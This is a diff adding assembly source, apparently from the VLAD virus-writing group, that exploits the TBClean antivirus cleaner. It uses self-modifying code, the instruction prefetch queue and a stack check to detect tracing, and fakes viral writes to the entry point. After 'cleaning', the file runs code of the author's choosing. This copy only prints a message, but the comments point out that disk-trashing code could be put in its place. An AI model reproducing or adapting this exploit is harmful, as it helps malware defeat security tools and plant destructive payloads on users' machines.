@@ -1,0 +1,88 @@
+                                                                              
+;Here is a small program that exploits the vulnerabilities of TBClean.
+
+;After being TBCleaned the file will execute any code we desire.  We could
+;make it so that the file runs fine normally but trashes disks when
+;TBCleaned.  (VLAD is opposed to this so we just display a message)
+
+;It plays with the stack and the instruction queue to completely confuse
+;TBClean.  The code knows when it is being run through TBClean and mimics
+;virus behaviour by writing bytes to the entry point and jumping to it.
+;TBClean saves the new bytes to file and says its now clean.  But our
+;program wrote the bytes that were already there!  So nothing has changed!
+;Also TBClean has modified the code so that it always runs the TBClean code
+;thus we can make the newly 'disinfected' file do what we want.
+
+;Confused ?  I am... :)  Look at the source!
+
+;Assemble with a86.
+
+
+;Credits to Terminator Z for developing the stack source and technique
+;of writing the same bytes to the entry point.
+
+
+     mov     byte ptr quit+1,1       ;Changes 'mov ax,0' to 'mov ax,1'
+                                     ;but due to the 80xxx instruction
+                                     ;queue the next line has already
+                                     ;been loaded into the CPU unchanged.
+                                     ;The memory image is changed anyway
+                                     ;so when TBClean writes to file it
+                                     ;will be written so that the
+                                     ;TBClean detection always runs.
+
+quit:
+     mov     ax,0                    ;TBClean will write 'mov ax,1' to
+     cmp     ax,1                    ;file.
+     je      tbrun
+
+     mov     ax,4c00h                ;The program reaches here normally
+     int     21h                     ;and terminates.
+
+tbrun:
+                                     ;Only TBClean or debug make it here.
+
+
+
+     cli                             ;If we are being traced through
+     mov     ax,1234h                ;the stack won't be the same as it
+     push    ax                      ;should be.
+     pop     ax
+     dec     sp
+     dec     sp
+     pop     bx
+     sti
+
+     cmp     bx,ax                   ;If BX=AX we are being run normally.
+     jne     init_tb
+
+     mov     ah,9
+     mov     dx,offset msg
+     int     21h
+
+
+     int     20h                     ;Quit to DOS.
+
+init_tb:                             ;Only tracing programs make it here.
+
+     mov     word ptr [100h],06c6h   ;Emulate viral code.  Moves the same
+     mov     bx,100h                 ;bytes as are already at the entry
+                                     ;point back to the entry point.
+
+
+     jmp     bx                      ;Jump back to the entry point.
+                                     ;TBClean will stop running here so
+                                     ;we don't have to worry about infinite
+                                     ;loops.
+
+
+     msg     db      'Hi!  I knew this message would be displayed after '
+             db      'using TBClean because it is'
+             db      0dh,0ah
+             db      'easy to manipulate.  '
+             db      'A virus programmer could easily use this to put '
+             db      'some ',0dh,0ah
+             db      'trashing code in... '
+             db      0dh,0ah
+             db      'Thanx Franz!$'
+
